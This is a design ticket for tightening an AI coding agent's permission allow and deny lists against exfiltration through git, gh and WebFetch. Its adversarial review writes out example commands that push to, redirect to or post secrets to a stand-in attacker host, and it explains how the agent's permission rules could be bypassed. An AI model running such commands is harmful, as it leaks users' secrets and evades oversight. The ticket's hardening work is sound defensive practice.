# Research: Close exfiltration channels in sandbox-excluded commands

## Epic Reference

Background context from [research/permissions-audit/research.md](../../research/permissions-audit/research.md) — DR-8 identifies that `git:*`, `gh:*`, and `WebFetch` are all sandbox-excluded AND in the allow list, creating exfiltration channels with only one security layer (permissions). This ticket addresses only the exfiltration channels; escape hatch concerns (DR-2) are handled by ticket 055.

## Codebase Analysis

### Files That Will Change

1. **`claude/settings.json`** (primary and only file) — modify allow/deny list entries for WebFetch, gh, and git

### Current Configuration

**WebFetch:**
- Allow list: `"WebFetch"` (line 15)
- Deny list: `"WebFetch(domain:localhost)"`, `"WebFetch(domain:127.0.0.1)"` (lines 204-205)
- excludedCommands: `"WebFetch"` (line 366)

**GitHub CLI:**
- Allow list: `"Bash(gh *)"` (line 136) — catch-all wildcard
- Deny list: none
- excludedCommands: `"gh:*"` (line 364)

**Git:**
- Allow list: individual command entries (`git log *`, `git diff *`, `git push *`, `git remote *`, `git config --get *`, `git config --list *`, etc.)
- Deny list: `git push --force *` (3 variants), `git reset --hard*`, `git clean -f*`
- excludedCommands: `"git:*"` (line 365)

### Complete gh Subcommand Inventory

Actual invocations found in the codebase:

| Subcommand | Used By | Files |
|-----------|---------|-------|
| `gh pr create` | /pr skill, overnight runner | skills/pr/SKILL.md, claude/overnight/runner.sh |
| `gh pr view` | /pr-review, overnight runner | skills/pr-review/references/protocol.md, runner.sh |
| `gh pr list` | /pr-review, morning review | skills/pr-review/references/protocol.md, morning-review walkthrough |
| `gh pr diff` | /pr-review | skills/pr-review/references/protocol.md |
| `gh pr merge` | morning review | skills/morning-review/references/walkthrough.md |
| `gh pr edit` | /pr skill (referenced) | skills/pr/SKILL.md |
| `gh pr checks` | mentioned in backlog | No actual invocations found |
| `gh repo view` | /pr skill | skills/pr/SKILL.md |
| `gh run list` | pipeline merge | claude/pipeline/merge.py |
| `gh api` | justfile (setup only) | justfile (lines 483, 527) — token validation only |

**Not used in codebase:** `gh gist create`, `gh issue view`, `gh issue list`, `gh issue create`, `gh repo clone`, `gh release`, `gh workflow`, `gh run view`, `gh secret`, `gh auth`

### WebFetch Usage

No direct WebFetch invocations found in any skill, hook, or script. All research workflows use Context7 and Perplexity MCP servers. The /research skill explicitly handles WebFetch unavailability: "If WebFetch is denied in this environment, fall back to WebSearch-only results."

### Git Exfiltration Commands

- `git remote add`: No usage in codebase
- `git send-email`: No usage in codebase
- `git archive`: No usage in codebase
- `git remote set-url`: No usage in codebase
- `git remote remove`: No usage in codebase

### Integration Points

**cortex-sync-permissions.py** (SessionStart hook): Merges global ~/.claude/settings.json with project-local .claude/settings.local.json. Changes to global allow/deny lists auto-propagate. No changes needed to the hook itself.

## Web Research

### Claude Code Permission Architecture

- **Evaluation order**: deny → ask → allow (first match wins). Deny always takes precedence.
- **Pattern matching**: Word-boundary enforcement — `Bash(npm *)` matches `npm run build` but not `npmx`. The `*` wildcard matches any characters within the argument string.
- **Settings hierarchy**: managed → CLI args → local project → shared project → user settings. Deny at any level cannot be overridden below.
- `autoAllowBashIfSandboxed: true` auto-approves non-denied commands within sandbox constraints — does NOT bypass deny rules.

### Community Hardening Patterns

- Deny-first rules blocking sensitive files before allowing operations
- Four-layer settings hierarchy preventing weakened security through override
- MCP server controls using `mcp__<server>__<tool>` format
- OS-level sandboxing as foundation
- Permission modes matched to workflow type

### GitHub Agentic Workflows Reference

GitHub's own agentic framework uses read-only-by-default permissions with explicit approval for writes via "safe outputs." Write requests map to pre-approved operations (PR creation, comments) rather than granting broad access. Uses sandboxed execution, tool allowlisting, and network isolation as defense-in-depth.

### Known Exfiltration Patterns

1. **Git**: `git remote add/set-url` + `git push` to attacker-controlled remotes; `git push <url>` directly (bypasses remote management deny rules); `git config url.*.insteadOf` silently redirects all git URLs
2. **GitHub CLI**: `gh gist create <file>`; `gh api POST` arbitrary data; `gh issue create --body`; `gh pr create --body` (any write operation with body content)
3. **WebFetch**: Direct HTTP requests to any domain (sandbox only restricts bash-level network, not WebFetch)

## Requirements & Constraints

### Security Architecture

- **Single-layer defense**: For sandbox-excluded commands (git, gh, WebFetch), the permission allow/deny list is the ONLY security boundary. The sandbox provides no OS-level fallback.
- **Overnight runner bypass**: `--dangerously-skip-permissions` means permission narrowing only affects interactive sessions. The overnight runner is unaffected by this ticket.
- **Global template impact**: `claude/settings.json` is copied to `~/.claude/settings.json` on first install. Changes affect ALL projects on the machine for any user who runs `just setup`.

### Project Philosophy

- "Optimize for public safety" — conservative defaults in shipped template
- "Complexity must earn its place by solving a real problem that exists now" — exfiltration channels are confirmed, not theoretical
- Day/night split: daytime is interactive collaboration (affected by this ticket); overnight is autonomous handoff (unaffected)

### Scope Boundaries

- **In scope**: Allow/deny list changes in `claude/settings.json` for WebFetch, gh, git
- **Out of scope**: Overnight runner permissions, excludedCommands removal, escape hatch verification (ticket 055), settings.local.json power-user additions, hook/script modifications

## Tradeoffs & Alternatives

### Alternative A — Deny-only approach

Keep `Bash(gh *)` in the allow list, add deny rules for dangerous gh subcommands.

- **Pros**: Minimal disruption; new safe gh features auto-allowed
- **Cons**: Ever-growing deny list; `gh api` remains broadly allowed; requires exhaustive enumeration; brittle against new dangerous patterns
- **Security**: Medium — blocks known patterns but leaves room for creative exploitation

### Alternative B — Ask-tier approach

Move WebFetch, gh, and git write operations to an explicit "ask" tier.

- **Pros**: Every operation user-reviewed; no enumeration needed; high security
- **Cons**: Significant friction (every git push, gh pr create prompts); "ask fatigue" risk; drives users to override with settings.local.json
- **Security**: High — but depends on user attentiveness

### Alternative C — Remove from excludedCommands

Remove git/gh/WebFetch from excludedCommands so the sandbox applies.

- **Pros**: OS-level enforcement; catches creative exploitation patterns
- **Cons**: Infeasible — sandbox restricts filesystem/network; git operations in the repo directory would be blocked; HTTPS push/fetch requires network access sandbox doesn't allow
- **Security**: Very high if feasible, but it isn't

### Ticket's Approach — Narrow allow + add deny

Remove WebFetch from allow, replace `gh *` with specific subcommands, deny `git remote add` and `gh gist create`.

- **Pros**: Targets confirmed vectors; minimal workflow disruption; aligns with existing settings patterns; straightforward implementation
- **Cons**: Requires careful subcommand enumeration; some vectors remain (see Adversarial Review)
- **Security**: Medium-high for the identified vectors

**Recommendation**: Ticket's approach, with adversarial refinements below.

## Adversarial Review

### Finding 1: `git push <url>` bypasses `git remote add` deny

The allow list includes `Bash(git push *)`. Denying `git remote add` prevents adding named remotes, but `git push https://attacker.example.com/repo.git` specifies the URL inline and matches the allow rule directly. This is a confirmed gap.

**Mitigation**: Add deny rules for inline URL pushes: `Bash(git push https://*)`, `Bash(git push http://*)`. Legitimate pushes use remote names (`git push origin main`), not raw URLs.

### Finding 2: `git remote set-url` is also a vector

The proposed approach denies `git remote add` but `Bash(git remote *)` also permits `git remote set-url origin https://attacker.example.com` — silently redirecting all future pushes. And `git remote remove origin` could disrupt workflows.

**Mitigation**: Narrow `git remote` allow to read-only operations: `Bash(git remote -v)`, `Bash(git remote get-url *)`, `Bash(git remote)`. Or deny: `Bash(git remote set-url *)`, `Bash(git remote remove *)`, `Bash(git remote add *)`.

### Finding 3: `git config url.*.insteadOf` redirects silently

`git config --global url."https://attacker.example.com/".insteadOf "https://github.com/"` transparently redirects all GitHub URLs. The current allow list permits `git config --get *` and `git config --list *` (read-only), but `Bash(git config *)` is NOT in the allow list — only the read-only variants are. This means `git config url.*` writes would already fall through to prompt. **This is not a gap in the current config.**

**Verification needed**: Confirm that `Bash(git config --get *)` and `Bash(git config --list *)` are the ONLY git config allows. If so, write operations are already gated.

### Finding 4: `gh pr create --body` is an exfiltration channel

Even with `gh gist create` denied, `gh pr create --body "$(cat secrets)"` can exfiltrate data via PR body. The /pr skill uses `--body-file` (file-based), not inline `--body`, but the allow pattern `Bash(gh pr create *)` permits both.

**Assessment**: This is a real vector but hard to mitigate without breaking the PR workflow. Pattern matching on flags (`--body` vs `--body-file`) is fragile and order-dependent. The human is present in interactive sessions and would see the PR being created. Accept as residual risk.

### Finding 5: `gh api` deny is safe

`gh api` is only used in the justfile for setup-time token validation (`gh api user --jq '.login'`). No runtime interactive usage exists. Safe to deny or remove from allow list.

### Finding 6: Overnight runner is architecturally separate

The overnight runner bypasses permissions entirely via `--dangerously-skip-permissions`. All hardening in this ticket only affects interactive sessions where a human is present. This is a known limitation, not a gap in this ticket's scope — the overnight runner's security model is a separate architectural concern.

## Open Questions

- ~~Should `git push https://*` and `git push http://*` be denied?~~ **RESOLVED**: Yes — deny inline URL pushes. Legitimate pushes use remote names (`origin`), not raw URLs. Low false-positive risk.
- ~~Should `git remote` be narrowed to read-only operations?~~ **RESOLVED**: Yes — replace broad `Bash(git remote *)` with read-only patterns (`git remote -v`, `git remote get-url *`). Covers set-url, remove, and add vectors.
- ~~Should `gh api` be denied outright or removed from allow?~~ **RESOLVED**: Remove from allow list (fall through to prompt). Allows intentional API queries with user review.
- ~~Is `gh pr create --body` exfiltration acceptable as residual risk?~~ **RESOLVED**: Yes — accept as residual risk. Human is present in interactive sessions. Pattern-matching on flags is fragile and would break /pr skill.
